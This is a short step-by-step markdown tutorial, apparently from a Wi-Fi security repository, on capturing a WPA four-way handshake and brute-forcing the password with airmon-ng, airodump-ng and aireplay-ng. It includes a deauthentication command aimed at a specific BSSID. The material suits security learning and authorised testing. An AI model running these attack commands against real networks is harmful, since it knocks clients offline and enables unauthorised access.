# Password Cracking
### Steps:
1: List all the available network Interfaces.
##### ifconfig
![1*UUCZ3_JuRp8crZqqaADL0A](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/96f65b78-6d6c-4f0a-a5af-ba89a17f05d8)

2: Monitor the desired network interface.
##### airmon-ng start wlan0
![1*F-ruSBGaG3us4925toikgA](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/fd5a7295-0274-4952-88b5-7540e46b4d7f)

3: Capture the network interface traffic.
##### airodump-ng wlan0mon
![1*kPltm6c1BRoUAfqXWEkMuw](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/99f2ec59-ab45-49cf-9866-04f487aaf933)

4: Capture required data from the specific network.
Now, we have to attack a specific network, so in order to do that, we will capture the traffic on that network and will start the capturing of the 4-way handshake. Enter the following command to do that.
##### airodump-ng -c 2 — bssid E8:65:D4:72:89:A1 wlan0mon
![1*tKYQzbgyuFbN-nW03H7Llg](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/449577dd-7cf1-472e-bac3-c8039e086d41)

5: De authenticate the client
Now, we have to de authenticate the client against the AP in case they’re already authenticated. To do so we use aireplay-ng command. Enter the following command to de authenticate the client in the new terminal window.
##### aireplay-ng -0 2 -a E8:65:D4:72:89:A1 wlan0mon
![1*lsV9CELoi__0Cn6VFpqchw](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/fdf61f05-f985-49d5-9618-28c80d43dabc)

6: Verify the captured handshake file.
![1*BLIW7TAu5qC3Gp-yKfi1-w](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/946989ec-9d4d-495f-806a-5bad98d35005)
#### Now our handshake file is successfully captured.

7: Stop Wi-Fi interface monitoring.
![1*2Oc6XnSzDqchO10ozYTiqg](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/31e6b548-3a5c-4b8a-ba98-38719b33be4c)

8: Cracking password from the captured handshake file.
Now everything is done it’s time to brute force the password. In order to get the password by means of a brute force attack, we need a wordlist and our handshake file.
![1*XiV-VFPMpRYWkO9bDyJ63Q](https://github.com/iamakky24/Exploring-WiFi-Security/assets/73874888/75acf195-2403-45ec-bce8-f5ead90af894)
#### It will display the key Found along with the key after successfully cracking the password.
